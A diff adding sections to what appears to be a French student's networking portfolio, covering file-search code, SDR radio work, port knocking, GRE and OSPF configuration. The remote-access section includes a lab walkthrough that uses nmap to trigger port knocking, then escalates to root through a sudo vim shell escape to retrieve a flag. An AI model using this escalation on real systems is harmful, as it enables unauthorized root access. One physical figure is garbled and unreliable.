+        if match_logic(line, query1, query2, mode):
+            results.append({
+                "file": filepath,
+                "location": f"Line {line_num}",
+                "context": line.strip()[:120]
+            })
+    return results</code></pre>
+                <p>
+                    <code>@lru_cache(maxsize=128)</code> est un décorateur de la bibliothèque
+                    standard Python qui mémoïse les résultats de la fonction. Le cache stocke
+                    les résultats des 128 derniers appels distincts (combinaisons uniques
+                    d'arguments). Lorsque la même combinaison d'arguments est redemandée, la
+                    valeur est retournée directement depuis le cache sans ré-exécuter la
+                    fonction. Le fichier n'est lu depuis le disque qu'une seule fois pour toutes
+                    les requêtes portant sur ce fichier dans la même session serveur. La fonction
+                    retourne un <code>tuple</code> (immuable) plutôt qu'une liste car
+                    <code>lru_cache</code> exige que les valeurs de retour soient hashables.
+                </p>
+
+                <p><strong>2. Accès aux fichiers HTML avec BeautifulSoup</strong></p>
+                <pre><code>from bs4 import BeautifulSoup
+
+def search_html(filepath, query1, query2, mode):
+    results = []
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            soup = BeautifulSoup(f, "html.parser")
+    except (OSError, IOError):
+        return results
+
+    # Extraire le texte visible uniquement (pas les balises, scripts, styles)
+    text = soup.get_text(separator="\n")
+    lines = [l.strip() for l in text.splitlines() if l.strip()]
+
+    for line_num, line in enumerate(lines, start=1):
+        if match_logic(line, query1, query2, mode):
+            results.append({
+                "file": filepath,
+                "location": f"Text line {line_num}",
+                "context": line[:120]
+            })
+    return results</code></pre>
+                <p>
+                    <code>BeautifulSoup(f, "html.parser")</code> parse le HTML avec le parser
+                    intégré de Python (aucune dépendance externe). <code>get_text(separator="\n")</code>
+                    extrait le contenu textuel de tous les nœuds de texte du DOM, en insérant
+                    un retour à la ligne entre les blocs (éléments de niveau bloc comme
+                    <code>div</code>, <code>p</code>, <code>h1</code>). Les scripts JavaScript
+                    (<code>&lt;script&gt;</code>) et CSS (<code>&lt;style&gt;</code>) sont
+                    automatiquement exclus. Le filtrage
+                    <code>if l.strip()</code> supprime les lignes vides.
+                </p>
+
+                <p><strong>3. Accès aux fichiers PDF avec PyPDF2</strong></p>
+                <pre><code>from PyPDF2 import PdfReader
+
+def search_pdf(filepath, query1, query2, mode):
+    results = []
+    try:
+        reader = PdfReader(filepath)
+    except Exception as e:
+        print(f"[ERROR] Cannot read PDF {filepath}: {e}")
+        return results
+
+    for page_num, page in enumerate(reader.pages, start=1):
+        page_text = page.extract_text()
+        if not page_text:
+            continue  # Page sans texte extractible (image scannée)
+
+        lines = page_text.splitlines()
+        for line_num, line in enumerate(lines, start=1):
+            line = line.strip()
+            if not line:
+                continue
+            if match_logic(line, query1, query2, mode):
+                results.append({
+                    "file": filepath,
+                    "location": f"Page {page_num}, Line {line_num}",
+                    "context": line[:120]
+                })
+    return results</code></pre>
+
+                <p><strong>4. Logique de correspondance unifiée (match_logic)</strong></p>
+                <pre><code>import re
+
+def match_logic(text, query1, query2, mode):
+    """
+    Unified matching logic for all file formats.
+    Returns True if text matches the query according to mode.
+    """
+    source = str(text).lower()
+    q1 = query1.lower().strip() if query1 else ""
+    q2 = query2.lower().strip() if query2 else ""
+
+    if mode == "simple":
+        return bool(q1) and (q1 in source)
+
+    elif mode == "and":
+        return bool(q1) and bool(q2) and (q1 in source) and (q2 in source)
+
+    elif mode == "or":
+        if not q1 and not q2:
+            return False
+        return (bool(q1) and q1 in source) or (bool(q2) and q2 in source)
+
+    elif mode == "regex":
+        if not query1:
+            return False
+        try:
+            return bool(re.search(query1, str(text), re.IGNORECASE))
+        except re.error as e:
+            print(f"[REGEX ERROR] Invalid pattern '{query1}': {e}")
+            return False  # Pattern invalide : pas de crash serveur
+
+    return False</code></pre>
+                <p>
+                    Le bloc <code>try/except re.error</code> sur le mode regex est critique pour
+                    la robustesse du serveur : si un client envoie un pattern regex invalide
+                    (par exemple <code>[</code> sans fermeture, ou <code>*</code> en début de
+                    pattern), <code>re.search()</code> lèverait une exception <code>re.error</code>
+                    qui, sans ce bloc, crasherait le thread ClientWorker et interromprait la
+                    connexion. Avec le bloc, le serveur retourne simplement aucun résultat
+                    sans crash. <code>str(text)</code> en entrée est nécessaire pour gérer
+                    les cellules Excel numériques (int, float, datetime) qui ne sont pas
+                    des chaînes de caractères nativement.
+                </p>
+            </div>
+        </details>
+
+    </div>
+</details>
+
+<!-- ============================================================ -->
+<!-- CONNECTER                                                     -->
+<!-- ============================================================ -->
+<details class="accordion-item">
+    <summary class="accordion-title">Connecter</summary>
+    <div class="accordion-content">
+
+        <!-- AC22.01 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC22.01 | Déployer et caractériser des systèmes de transmissions complexes
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.01 – Mettre en œuvre un système de
+                    transmission</strong>, j'ai étudié, déployé et caractérisé plusieurs systèmes
+                    de transmission radio complexes, en combinant recherche bibliographique,
+                    manipulations pratiques sur des équipements SDR réels, et analyse spectrale.
+                </p>
+
+                <p><strong>1. Recherche bibliographique sur les équipements SDR</strong></p>
+                <p>
+                    J'ai réalisé une recherche approfondie sur trois équipements de la SAÉ.
+                    L'<strong>Adalm-Pluto</strong> (ADALM-PLUTO de Analog Devices) est un SDR
+                    bidirectionnel (émission + réception) basé sur le transceiver AD9363. Ses
+                    caractéristiques clés : plage de fréquences de <strong>325 MHz à 3,8 GHz</strong>,
+                    largeur de bande instantanée maximale de <strong>20 MHz</strong>, taux
+                    d'échantillonnage configurable jusqu'à <strong>61,44 MSPS</strong> (méga
+                    échantillons par seconde), résolution ADC/DAC de 12 bits. Il se connecte
+                    via USB 2.0 et est reconnu comme un périphérique IIO (Industrial I/O) sous
+                    Linux, utilisable directement avec GNU Radio via le bloc
+                    <code>PlutoSDR Source/Sink</code>.
+                </p>
+                <p>
+                    Le <strong>Spectran V4</strong> (AARONIA) est un analyseur de spectre portable
+                    couvrant plusieurs gammes de fréquences selon le modèle (jusqu'à 9,4 GHz pour
+                    les versions haut de gamme). Il mesure la densité de puissance spectrale des
+                    signaux radio environnants et retourne des données utilisables par le logiciel
+                    <strong>MCS Spectrum Analyzer</strong> (Aaronia) via des fichiers .mdr
+                    (Measurement Data Recording). L'antenne <strong>Hyperlog 7060</strong> est
+                    une antenne directive log-périodique couvrant la bande <strong>680 MHz –
+                    6 GHz</strong>, avec un gain de 6-11 dBi selon la fréquence et un angle
+                    d'ouverture de 70° en azimut et 60° en élévation. Sa directivité permet
+                    de pointer vers une source précise pour mesurer sa puissance.
+                </p>
+                <p>
+                    À partir du <strong>TNRBF</strong> (Tableau National de Répartition des
+                    Bandes de Fréquences), j'ai établi un tableau des bandes autorisées pour
+                    l'Adalm-Pluto : la bande ISM à 2,4 GHz (2400-2483,5 MHz) et la bande ISM
+                    à 5,8 GHz sont librement utilisables pour les expérimentations à faible
+                    puissance. Les bandes LTE opérateur (700 MHz, 800 MHz, 1800 MHz, 2100 MHz,
+                    2600 MHz) ne peuvent être émises qu'avec une autorisation ARCEP. L'émission
+                    non autorisée dans ces bandes constitue une infraction.
+                </p>
+
+                <p><strong>2. Prise en main de GNU Radio Companion</strong></p>
+                <p>
+                    GNU Radio Companion (GRC) est un environnement de développement visuel par
+                    blocs pour les applications SDR. Un flowgraph GNU Radio est constitué de :
+                    <strong>sources</strong> (génèrent des échantillons : Signal Source, File
+                    Source, SDR Source), <strong>blocs de traitement du signal</strong>
+                    (Rational Resampler, Low Pass Filter, WBFM Receive, AGC, Multiply Const),
+                    et <strong>puits</strong> (consomment les échantillons : Audio Sink, File
+                    Sink, QT GUI Sink). Les blocs sont connectés par des liens représentant
+                    des flots d'échantillons complexes (I/Q – In-phase et Quadrature).
+                </p>
+                <p>
+                    J'ai d'abord réalisé des exercices d'initiation (émetteur AM, récepteur AM)
+                    pour comprendre la logique de traitement du signal numérique, puis développé
+                    un récepteur FM complet.
+                </p>
+
+                <p><strong>3. Récepteur FM avec Adalm-Pluto et relation Fs</strong></p>
+                <p>
+                    La difficulté principale de la réception FM avec un SDR est d'assurer la
+                    compatibilité entre le taux d'échantillonnage du SDR et le taux attendu
+                    par la carte son. La relation à respecter est :
+                </p>
+                <pre><code>Fs = samp_rate / dRS × dAD</code></pre>
+                <p>
+                    Où <strong>samp_rate</strong> est le taux d'échantillonnage de l'Adalm-Pluto
+                    (par exemple 2 048 000 Hz = 2,048 MSPS pour couvrir la bande FM), <strong>dRS</strong>
+                    est le facteur de décimation du bloc Rational Resampler (qui réduit le débit
+                    en gardant 1 échantillon sur dRS), et <strong>dAD</strong> est le facteur
+                    d'interpolation du second Resampler vers la carte son. <strong>Fs</strong>
+                    doit être égal à 48 000 Hz (48 kHz) ou 44 100 Hz (44,1 kHz) selon la carte
+                    son utilisée. Avec samp_rate = 2 048 000, dRS = 32, dAD = 3/4 :
+                </p>
+                <pre><code>Fs = 2 048 000 / 32 × (3/4) = 64 000 × 0.75 = 48 000 Hz ✓</code></pre>
+                <p>
+                    Le bloc <strong>WBFM Receive</strong> (Wide-Band FM Receiver) démodule le
+                    signal FM (déviation de fréquence ±75 kHz pour la FM broadcast). La chaîne
+                    complète : PlutoSDR Source → Low Pass Filter (coupe les canaux FM adjacents)
+                    → Rational Resampler (décimation) → WBFM Receive → Rational Resampler
+                    (interpolation vers 48 kHz) → Audio Sink.
+                </p>
+
+                <p><strong>4. Standard DAB+ et ses caractéristiques</strong></p>
+                <p>
+                    Le <strong>DAB+</strong> (Digital Audio Broadcasting Plus) utilise la
+                    modulation <strong>COFDM</strong> (Coded OFDM) avec 1536 sous-porteuses
+                    sur une largeur de bande de 1,536 MHz, espacées de 1 kHz. Le préfixe cyclique
+                    (guard interval) de 246 μs protège contre les évanouissements multichemins
+                    (réflexions sur les bâtiments). Le codec audio <strong>HE-AAC v2</strong>
+                    offre une qualité équivalente à la FM pour 32 kbit/s seulement.
+                    Par rapport à la FM analogique (200 kHz de bande passante par station),
+                    DAB+ est 6 fois plus efficace spectralement. En France, DAB+ est déployé
+                    en bande III (174-240 MHz).
+                </p>
+            </div>
+        </details>
+
+        <!-- AC22.02 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC22.02 | Mettre en place un accès distant sécurisé
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.Cyber.04 – Découvrir le pentesting</strong>,
+                    j'ai mis en place un accès distant sécurisé par <strong>SSH</strong> sur une
+                    machine cible en résolvant une problématique technique complexe liée au
+                    mécanisme de port knocking et au timing de l'établissement de connexion TCP.
+                </p>
+
+                <p><strong>1. Protocole SSH et mécanismes de sécurité</strong></p>
+                <p>
+                    SSH (Secure Shell, RFC 4251-4254) est le protocole standard de connexion
+                    distante sécurisée. Il fonctionne sur le port TCP 22 par défaut et établit
+                    un canal chiffré en plusieurs phases : négociation de l'algorithme de clé
+                    (Diffie-Hellman, ECDH), échange des clés publiques de serveur, authentification
+                    du client (par mot de passe ou clé publique), puis ouverture du canal de
+                    données. Toutes les communications après l'échange initial sont chiffrées
+                    avec AES (symétrique) et authentifiées avec HMAC-SHA2. La première connexion
+                    à un serveur demande à l'utilisateur de vérifier et accepter la clé publique
+                    du serveur (fingerprint), qui est ensuite stockée dans <code>~/.ssh/known_hosts</code>
+                    pour les connexions suivantes.
+                </p>
+
+                <p><strong>2. Port knocking : mécanisme et implémentation iptables</strong></p>
+                <p>
+                    Le port knocking est implémenté via le module <code>xt_recent</code> d'iptables,
+                    qui maintient une liste d'adresses IP ayant récemment contacté des ports
+                    spécifiques. Un exemple de configuration iptables implémentant un port
+                    knocking en trois étapes (ports 7000, 8000, 9000) serait :
+                </p>
+                <pre><code># Étape 1 : garder trace des IPs ayant touché le port 7000
+iptables -A INPUT -p tcp --dport 7000 -m recent --name KNOCK1 --set -j DROP
+# Étape 2 : si l'IP a fait KNOCK1 ET touche le port 8000
+iptables -A INPUT -p tcp --dport 8000 -m recent --name KNOCK1 --rcheck \
+    -m recent --name KNOCK2 --set -j DROP
+# Étape 3 : si l'IP a fait KNOCK2 ET touche le port 9000 → ouvrir SSH
+iptables -A INPUT -p tcp --dport 9000 -m recent --name KNOCK2 --rcheck \
+    -m recent --name OPEN --set -j DROP
+# Autoriser SSH seulement si l'IP est dans la liste OPEN
+iptables -A INPUT -p tcp --dport 22 -m recent --name OPEN --rcheck \
+    --seconds 30 -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j DROP</code></pre>
+                <p>
+                    L'option <code>--seconds 30</code> ferme automatiquement l'accès SSH après
+                    30 secondes si aucune connexion n'est établie. C'est précisément ce délai
+                    court qui créait la difficulté de synchronisation.
+                </p>
+
+                <p><strong>3. Solution technique : deux terminaux en parallèle</strong></p>
+                <p>
+                    Le problème était que la fenêtre d'ouverture du port SSH durait seulement
+                    quelques secondes après le port knocking. En exécutant séquentiellement
+                    (port knocking, puis SSH), le port se refermait avant que la poignée de
+                    main TCP soit complète. La solution technique utilise deux terminaux simultanés :
+                </p>
+                <pre><code># Terminal 1 (lancer EN PREMIER, SSH attend en boucle) :
+ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c3a8f2b7b7f0adb083f2f3edf2f5edf1f3edf2fbf4">[email&#160;protected]</a>
+# ssh: connect to host 10.16.20.187 port 22: Connection refused
+# (ou Connection timed out si le port est filtré)
+# Le client SSH continue d'essayer...
+
+# Terminal 2 (déclencher le port knocking) :
+nmap 10.16.20.187 -r
+# -r : scanner les ports dans l'ordre (important pour la séquence de knocking)
+# Le scan nmap envoie des paquets SYN sur les ports dans l'ordre
+# → déclenche la séquence de port knocking
+# → iptables ouvre le port 22 pour l'IP source (10.15.250.129)
+
+# Immédiatement, dans le Terminal 1 :
+# ssh: connect to host 10.16.20.187 port 22: ... (success)
+# k1tt3ns@target:~$</code></pre>
+
+                <p><strong>4. Session SSH complète et administration post-connexion</strong></p>
+                <pre><code>k1tt3ns@target:~$ whoami
+k1tt3ns
+k1tt3ns@target:~$ id
+uid=1001(k1tt3ns) gid=1001(k1tt3ns) groups=1001(k1tt3ns)
+k1tt3ns@target:~$ sudo -l
+User k1tt3ns may run the following commands on target:
+    (ALL : ALL) NOPASSWD: /usr/bin/vim
+k1tt3ns@target:~$ sudo /usr/bin/vim
+# Dans vim :
+:!bin/sh
+# sh-5.0#
+# sh-5.0# whoami
+# root
+# sh-5.0# cd /home/k1tt3ns
+# sh-5.0# ls -la
+# total 24
+# -rw-r--r-- 1 k1tt3ns k1tt3ns  ... flag.sh
+# sh-5.0# ./flag.sh
+# Enter your IP address: 10.15.250.129
+# [FLAG RETRIEVED SUCCESSFULLY]</code></pre>
+            </div>
+        </details>
+
+        <!-- AC22.03 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC22.03 | Mettre en place une connexion multi-site via un réseau opérateur
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai mis en place une interconnexion sécurisée entre deux sites distants en
+                    déployant un tunnel <strong>GRE over IPSec</strong> à travers un routeur de
+                    transit R2, simulant un réseau opérateur.
+                </p>
+
+                <p><strong>1. Architecture : tunnel GRE à travers un routeur de transit</strong></p>
+                <p>
+                    Trois routeurs constituent l'infrastructure WAN : R1 (site gauche,
+                    10.0.0.1), R2 (transit opérateur, 10.0.0.2 / 10.0.1.1) et R3 (site droit,
+                    10.0.1.2). Le tunnel GRE s'établit directement entre R1 et R3 <em>à travers</em>
+                    R2. R2 ne connaît que les adresses de transit et reste ignorant de la
+                    topologie interne des deux sites, ce qui représente exactement le modèle
+                    d'un réseau opérateur réel : l'entreprise utilise l'infrastructure de
+                    transport sans lui exposer ses routes internes.
+                </p>
+
+                <p><strong>2. Configuration du tunnel GRE sur R1 et R3</strong></p>
+                <pre><code>! Configuration R1 (site gauche)
+interface GigabitEthernet0/0
+ ip address 10.0.0.1 255.255.255.0   ! Lien vers R2 (réseau opérateur)
+ no shutdown
+interface Tunnel0
+ ip address 172.30.255.1 255.255.255.252
+ tunnel source GigabitEthernet0/0    ! Source : 10.0.0.1
+ tunnel destination 10.0.1.2         ! Destination : interface de R3 côté opérateur
+
+! Configuration R3 (site droit)
+interface GigabitEthernet0/0
+ ip address 10.0.1.2 255.255.255.0   ! Lien vers R2 (réseau opérateur)
+ no shutdown
+interface Tunnel0
+ ip address 172.30.255.2 255.255.255.252
+ tunnel source GigabitEthernet0/0    ! Source : 10.0.1.2
+ tunnel destination 10.0.0.1         ! Destination : interface de R1 côté opérateur
+
+! Vérification du tunnel
+R1# show interfaces Tunnel0
+Tunnel0 is up, line protocol is up
+R1# ping 172.30.255.2
+!!!!!</code></pre>
+
+                <p><strong>3. Dual OSPF process — séparation réseau physique / tunnel</strong></p>
+                <p>
+                    R1 et R3 utilisent deux processus OSPF distincts pour séparer proprement
+                    le routage du réseau de transit et le routage à travers le tunnel :
+                </p>
+                <pre><code>! R1 — OSPF process 1 : réseau physique de transit
+router ospf 1
+ network 10.0.0.0   0.0.0.255 area 0  ! Lien R1 ↔ R2
+ network 172.16.1.0 0.0.0.255 area 0  ! Lien R1 ↔ FIREWALL-1
+ network 172.16.0.0 0.0.0.255 area 0  ! Inside FIREWALL-1 ↔ SR1
+
+! R1 — OSPF process 2 : tunnel GRE inter-sites avec redistribution
+router ospf 2
+ redistribute ospf 1     ! Injecter les routes du réseau physique
+ redistribute connected  ! Injecter les réseaux directement connectés
+ network 172.30.255.0 0.0.0.3 area 0  ! Interface Tunnel0</code></pre>
+                <p>
+                    La redistribution mutuelle entre OSPF 1 et OSPF 2 est le mécanisme clé :
+                    OSPF 2 apprend les routes internes (VLANs Admin/Service/Production, DMZ)
+                    via OSPF 1 et les propage à l'autre site à travers le tunnel. Sans cette
+                    redistribution, les réseaux internes resteraient invisibles de l'autre côté.
+                    Les pare-feux ASA participent également à OSPF 1 pour annoncer les réseaux
+                    LAN inside et DMZ.
+                </p>
+
+                <p><strong>4. Services rendus accessibles inter-sites grâce au tunnel</strong></p>
+                <p>
+                    Grâce au tunnel GRE et à la redistribution OSPF, les VLANs Admin de chaque
+                    site peuvent accéder aux serveurs DMZ de l'autre site. Les enregistrements
+                    DNS croisés permettent à admin (site gauche) de résoudre
+                    <code>dmz2.entreprise.local → 192.168.41.2</code> et d'accéder en HTTPS
+                    au serveur DMZ du site droit, et réciproquement. Cet accès inter-sites
+                    est validé par les tests <code>nslookup</code> et
+                    <code>https://dmz2.entreprise.local</code> depuis les postes Admin.
+                </p>
+            </div>
+        </details>
+
+        <!-- AC22.04 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC22.04 | Déployer des réseaux d'accès des opérateurs
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.01 – Mettre en œuvre un système de
+                    transmission</strong>, j'ai étudié et analysé concrètement les réseaux
+                    d'accès déployés par les opérateurs télécoms, en observant leurs signaux
+                    directement avec des équipements de mesure.
+                </p>
+
+                <p><strong>1. Analyse du réseau mobile 4G/LTE</strong></p>
+                <p>
+                    LTE (Long Term Evolution, 3GPP Release 8) est la technologie cellulaire
+                    dite "4G". Elle utilise OFDMA (Orthogonal Frequency Division Multiple Access)
+                    en voie descendante et SC-FDMA en voie montante. L'accès multiple est obtenu
+                    en allouant des <strong>Resource Blocks</strong> (RBs) à chaque terminal :
+                    un RB est constitué de 12 sous-porteuses OFDM × 7 symboles OFDM dans le domaine
+                    temps-fréquence, représentant 180 kHz × 0,5 ms. La bande passante d'un canal
+                    LTE peut être 1,4 / 3 / 5 / 10 / 15 / 20 MHz.
+                </p>
+                <p>
+                    En utilisant MCS Spectrum Analyzer couplé au Spectran V4, j'ai capturé et
+                    analysé les signaux échangés entre mon terminal mobile et un relais 4G LTE
+                    proche de l'IUT de Béthune. J'ai pu identifier dans les captures :
+                    le canal de synchronisation (<strong>PSS/SSS</strong> – Primary/Secondary
+                    Synchronization Signal) permettant au terminal de détecter la cellule et
+                    se synchroniser dessus ; le canal de diffusion (<strong>PBCH</strong> –
+                    Physical Broadcast Channel) qui transmet les paramètres système (MIB :
+                    Master Information Block) ; les niveaux de puissance RSSI (Received Signal
+                    Strength Indicator) et RSRP (Reference Signal Received Power) indiquant
+                    la qualité de la réception.
+                </p>
+
+                <p><strong>2. Analyse Wi-Fi (IEEE 802.11)</strong></p>
+                <p>
+                    J'ai analysé les réseaux Wi-Fi environnants à l'IUT avec MCS Spectrum Analyzer.
+                    En bande <strong>2,4 GHz</strong> (IEEE 802.11b/g/n), j'ai observé les
+                    14 canaux nominaux de 20 MHz espacés de 5 MHz, dont les canaux se chevauchent
+                    partiellement. Seuls les canaux <strong>1, 6 et 11</strong> sont non-chevauchants.
+                    Dans l'environnement IUT, plusieurs réseaux utilisaient des canaux adjacents
+                    (par exemple canaux 2 et 5), créant des interférences co-canal dégradant les
+                    performances. En bande <strong>5 GHz</strong> (IEEE 802.11a/ac/ax), les canaux
+                    de 20 MHz sont espacés de 20 MHz (donc non chevauchants), offrant jusqu'à
+                    23 canaux disponibles en Europe selon les bandes UNII.
+                </p>
+                <p>
+                    Cette analyse illustre les défis auxquels font face les opérateurs de réseaux
+                    Wi-Fi (hotspots publics, Wi-Fi entreprise) : la bande 2,4 GHz est surchargée
+                    (aussi utilisée par Bluetooth, micro-ondes, ZigBee) tandis que la 5 GHz
+                    offre plus de bande passante mais avec une portée réduite (absorption plus
+                    forte par les matériaux).
+                </p>
+
+                <p><strong>3. Standard DAB+ (réseaux d'accès radio numériques)</strong></p>
+                <p>
+                    Le <strong>DAB+</strong> (Eureka 147, ETSI EN 300 401) est le standard de
+                    radiodiffusion numérique terrestre déployé en Europe par les opérateurs de
+                    radio. Architecture du signal DAB+ : chaque multiplex (ensemble) DAB occupe
+                    une largeur de bande de <strong>1,536 MHz</strong> et peut transporter
+                    plusieurs programmes audio (10 à 20 selon les débits) grâce au multiplexage
+                    OFDM. Les sous-porteuses sont espacées de 1 kHz avec un préfixe cyclique
+                    de 246 μs protégeant contre les réflexions multichemins jusqu'à 246 km/s
+                    de différence de trajet. En France, les opérateurs DAB+ déploient sur la
+                    <strong>bande III</strong> (174-240 MHz) dans les grandes agglomérations.
+                    Le codec <strong>HE-AAC v2</strong> offre une qualité FM pour 32 kbit/s
+                    (contre 192 kbit/s pour le MP3 de qualité équivalente), permettant de
+                    diffuser davantage de programmes par multiplex.
+                </p>
+            </div>
+        </details>
+
+        <!-- AC22.05 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC22.05 | Capacité à questionner un cahier des charges RT
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai analysé et questionné le cahier des charges pour concevoir une infrastructure
+                    réseau d'entreprise deux sites avec pare-feux, DMZ et VPN.
+                </p>
+
+                <p><strong>1. Identification et traduction des besoins en contraintes techniques</strong></p>
+                <p>
+                    Le CDC imposait plusieurs exigences qui ont nécessité des choix architecturaux
+                    justifiés. <em>Exigence de segmentation :</em> l'entreprise comprend trois profils
+                    distincts (Admin, Service, Production) avec des niveaux de confiance différents
+                    → traduction : 3 VLANs par site avec ACLs différenciées et politique d'isolation
+                    stricte pour Service et Production. <em>Exigence de services publics :</em> des
+                    services web et DNS doivent être accessibles depuis les deux sites sans exposer
+                    le LAN interne → traduction : DMZ isolée sur une troisième interface ASA, serveurs
+                    DMZ séparés physiquement du LAN. <em>Exigence d'interconnexion sécurisée :</em>
+                    les deux sites doivent communiquer sans exposer la topologie interne à l'opérateur
+                    → traduction : tunnel GRE over IPSec avec OSPF dual-process.
+                </p>
+
+                <p><strong>2. Choix architecturaux justifiés</strong></p>
+                <p>
+                    <em>Pourquoi une DMZ et non exposer les serveurs directement dans le LAN ?</em>
+                    Si un serveur web en LAN est compromis, l'attaquant accède directement à tous
+                    les VLANs internes. Avec une DMZ, il est cloisonné dans le réseau 192.168.40.0/24,
+                    isolé du LAN par le pare-feu ASA. L'ACL <code>DMZ_IN</code> limite ce que le
+                    serveur peut initier depuis la DMZ, limitant les mouvements latéraux.
+                </p>
+                <p>
+                    <em>Pourquoi une double couche de filtrage (ACL switch L3 + ASA) et non uniquement
+                    le pare-feu ?</em> Une seule couche ASA ne filtrerait pas les flux locaux entre
+                    VLANs avant qu'ils n'atteignent le pare-feu. La couche ACL sur le switch L3 bloque
+                    les initiations dès la sortie du VLAN source (au plus proche de la source, meilleure
+                    pratique Cisco), réduisant la charge du pare-feu et ajoutant une défense en
+                    profondeur : la compromission d'une couche ne suffit pas à atteindre les ressources.
+                </p>
+                <p>
+                    <em>Pourquoi GRE over IPSec et non simplement un peering BGP avec l'opérateur ?</em>
+                    BGP exposerait les routes internes sur un réseau partagé. GRE encapsule et IPSec
+                    chiffre : R2 (opérateur) ne voit que des paquets IPSEC opaques entre 10.0.0.1 et
+                    10.0.1.2 et n'a aucune connaissance des réseaux 172.16.x.x, 192.168.x.x et des DMZ.
+                </p>
+
+                <p><strong>3. Matrice d'accès Admin / Service / Production — issue du CDC</strong></p>
+                <pre><code>Réseau          LAN local    LAN autre site   DMZ locale   DMZ distante   DNS
+Admin VLAN10    Autorisé     Autorisé          Autorisé     Autorisé       Local+distant
+Service VLAN20  Bloqué(sw)   Bloqué(FW)        Bloqué(FW)  Bloqué(FW)    Non autorisé
+Prod. VLAN30    Bloqué(sw)   Bloqué(FW)        Bloqué(FW)  Bloqué(FW)    Non autorisé</code></pre>
+                <p>
+                    Cette matrice, issue de l'analyse du CDC, est directement traduite en règles ACL
+                    sur les switchs L3 et en ACLs ASA. Elle constitue la référence de vérification
+                    finale : chaque ligne de la matrice est testée et validée dans le tableau de
+                    conformité du Write Up.
+                </p>
+            </div>
+        </details>
+
+
+    </div>
+</details>
+
+
+<!-- ============================================================ -->
+<!-- ADMINISTRER                                                   -->
+<!-- ============================================================ -->
+<details class="accordion-item">
+    <summary class="accordion-title">Administrer</summary>
+    <div class="accordion-content">
+
+        <!-- AC21.01 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC21.01 | Configurer et dépanner le routage dynamique dans un réseau
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai configuré le routage dynamique OSPF sur l'ensemble de l'infrastructure
+                    réseau deux sites avec une architecture à deux processus distincts sur les
+                    routeurs de bordure.
+                </p>
+
+                <p><strong>1. OSPF sur les switchs L3 (SR1 et SR2)</strong></p>
+                <p>
+                    OSPF (Open Shortest Path First) est un protocole de routage à état de liens
+                    qui construit une carte complète de la topologie réseau et calcule les meilleurs
+                    chemins avec l'algorithme de Dijkstra. Sur les switchs L3, le routage IP est
+                    activé (<code>ip routing</code>) et les sous-réseaux de chaque VLAN sont déclarés :
+                </p>
+                <pre><code>! SR1 — site gauche
+ip routing
+router ospf 1
+ network 172.16.0.0   0.0.0.255 area 0  ! Lien vers FIREWALL-1
+ network 192.168.10.0 0.0.0.255 area 0  ! VLAN Admin
+ network 192.168.20.0 0.0.0.255 area 0  ! VLAN Service
+ network 192.168.30.0 0.0.0.255 area 0  ! VLAN Production
+
+! SR2 — site droit (symétrique)
+router ospf 1
+ network 172.16.10.0  0.0.0.255 area 0
+ network 192.168.11.0 0.0.0.255 area 0
+ network 192.168.21.0 0.0.0.255 area 0
+ network 192.168.31.0 0.0.0.255 area 0</code></pre>
+
+                <p><strong>2. Dual OSPF process sur R1 et R3 — séparation transit / tunnel</strong></p>
+                <pre><code>! R1 — OSPF 1 : réseau physique de transit
+router ospf 1
+ network 10.0.0.0   0.0.0.255 area 0  ! Lien R1 ↔ R2
+ network 172.16.1.0 0.0.0.255 area 0  ! Lien R1 ↔ FIREWALL-1
+
+! R1 — OSPF 2 : tunnel GRE avec redistribution
+router ospf 2
+ redistribute ospf 1
+ redistribute connected
+ network 172.30.255.0 0.0.0.3 area 0  ! Interface Tunnel0
+
+! FIREWALL-1 — OSPF 1 : annonce ses réseaux LAN et DMZ
+router ospf 1
+ network 172.16.0.0   255.255.255.0 area 0  ! Inside ↔ SR1
+ network 172.16.1.0   255.255.255.0 area 0  ! Outside ↔ R1
+ network 192.168.40.0 255.255.255.0 area 0  ! DMZ</code></pre>
+                <p>
+                    Le dual OSPF process évite d'exposer les réseaux internes (VLANs, DMZ)
+                    dans le processus de transit. OSPF 1 gère le réseau partagé avec l'opérateur ;
+                    OSPF 2 gère le tunnel GRE et utilise la redistribution pour propager les
+                    routes internes entre les deux sites.
+                </p>
+
+                <p><strong>3. Vérification et dépannage</strong></p>
+                <pre><code>! Vérifier les voisins OSPF
+show ip ospf neighbor
+! Neighbor ID  State    Interface
+! R3_addr      FULL     Tunnel0
+
+! Vérifier les routes apprises
+show ip route ospf
+! O E2  192.168.11.0/24 [110/20] via 172.30.255.2 (routes du site distant)
+! O     192.168.40.0/24 [110/2]  via 172.16.1.1   (DMZ locale via FIREWALL-1)
+
+! Vérifier qu'OSPF tourne bien sur le tunnel
+show ip ospf interface Tunnel0</code></pre>
+
+                <p><strong>4. HSRP et relais DHCP — SAÉ 3.Cyber.03</strong></p>
+                <p>
+                    Dans la <strong>SAÉ 3.Cyber.03 – Concevoir un réseau informatique sécurisé
+                    multi-sites</strong>, j'ai approfondi la configuration du routage dynamique
+                    avec HSRP pour la redondance des passerelles et le relais DHCP pour la
+                    centralisation de l'attribution d'adresses.
+                </p>
+                <p>
+                    <strong>HSRP (Hot Standby Router Protocol)</strong> crée une passerelle
+                    virtuelle partagée entre deux switchs de distribution (SR1_siege et SR2_siege).
